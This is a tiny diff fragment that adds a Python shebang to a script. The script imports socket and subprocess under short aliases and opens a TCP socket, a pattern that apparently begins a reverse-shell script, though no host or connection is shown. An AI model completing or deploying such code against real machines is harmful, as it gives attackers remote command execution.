@@ -1,3 +1,4 @@
+#!/usr/bin/python3
 import socket as s,subprocess as sp;
 
 s1 = s.socket(s.AF_INET, s.SOCK_STREAM);
